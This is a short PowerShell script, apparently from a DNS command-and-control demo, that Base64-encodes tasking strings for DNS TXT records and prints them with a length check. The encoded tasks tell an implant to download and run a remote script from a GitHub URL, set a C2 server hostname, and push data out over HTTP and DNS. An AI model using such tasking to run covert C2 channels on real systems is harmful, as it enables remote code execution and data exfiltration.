Function Write-TXTEncodedRecord {
    PARAM (
        $str,
        $maxLength = 255
    )

    [string]$encodedStr = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($str))
    
    Write-Host "$($str)"
    If ($encodedStr.Length -gt $maxLength) {
        Write-Host "   $($encodedStr)" -ForegroundColor Red -NoNewline
        Write-Host " (Max length of $($maxLength) reached with $($encodedStr.Length) chars)"
    } else {
        Write-Host "   $($encodedStr)" -ForegroundColor Yellow
    }

    Write-Host ""
}

Write-TXTEncodedRecord 'riro;0;Write;Time to do some C2-stuff ;)'
Write-TXTEncodedRecord 'riro;1;Get;https://raw.githubusercontent.com/rirofal/DNS-C2-Demo/main/demo-remote-script.ps1'
Write-TXTEncodedRecord 'riro;2;PS;demo-remote-script.ps1'
Write-TXTEncodedRecord 'riro;3;Set;c2demoserver.ronnkvist.nu'
Write-TXTEncodedRecord 'riro;4;http;demo-push-out.txt'
Write-TXTEncodedRecord 'riro;5;DNS;demo-push-out.txt'
